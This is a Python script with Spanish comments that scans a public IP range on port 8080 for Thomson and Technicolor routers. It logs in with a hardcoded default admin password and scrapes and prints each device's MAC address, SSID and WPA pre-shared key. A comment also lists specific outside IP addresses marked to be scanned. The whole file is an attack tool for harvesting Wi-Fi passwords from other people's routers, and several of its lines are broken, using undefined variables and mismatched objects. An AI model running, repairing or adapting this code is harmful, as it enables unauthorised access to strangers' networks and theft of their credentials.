# -*- coding: utf-8 -*-
import requests 
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as BS
from netaddr import *
global user, password

device_thompson = 0
device_technicolor = 0
header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
#181.52.82.215 181.54.153.14 http://186.87.3.237:8080/wlanRadio.asp 180-50 http://181.50.1.32:8080/wlanPrimaryNetwork.asp<<<< escanear esto
user = "admin"
password = "Uq-4GIt3M"
thom = 'Basic realm="Thomson"'
tech = 'Basic realm="Technicolor"'
#routers = open('db.csv','aw')
print "Estoy aqui"
   
def technicolor(ip):
    s = requests.Session()
    r = s.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth(username, password), timeout=None, headers=header)
    #guest = s.get('http://'+ip+':8080/wlanGuestNetwork.asp', timeout=None)
    html = BS(r.content , "html.parser")
    for datos in r.findAll("td", align="middle"):
        t = name.text[16:]
        ma = t[-19:]
        mac = ma[1:-1]
        ssid = t[0:-19]
        for pwd in r.find_all("input", {'name':"WpaPreSharedKey"}):
           print ip+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]
           #routers.write(ip+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+',enable'+'\n')

def thompson(ip):
    
    s = requests.Session()
    r = s.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth(user,password), timeout=None, headers=header)
    html = BS(r.content, "html.parser")
    for datos in html.find_all("td", align="middle"):
        
        t = name.text[16:]
        ma = t[-19:]
        mac = ma[1:-1]
        ssid = t[0:-19] 
        for pwd in html.find_all("input", {'name':"WpaPreSharedKey"}):
            #routers.write(ip+','+'Thomson'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+','+'\n')
            print ip+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]
#186.84.10.45           
for ip in IPNetwork("186.84.10.0/24"):
    
    try:
        
        r = requests.get('http://'+ip+':8080/', timeout=None, headers=header)
        device_head = r.headers
        print device_head
        if technicolor in device_head:
            device_technicolor = device_technicolor + 1
            technicolor(ip)
        elif thom in device_head:
            device_thompson = device_thompson + 1
            thompson(ip)
        else:
            pass
           
    except:
        pass
                
print str(device_technicolor)+" technicolor"
print str(device_thompson)+" tomson"
print str(device_thompson+device_technicolor)+" En total"


        
        
       
            
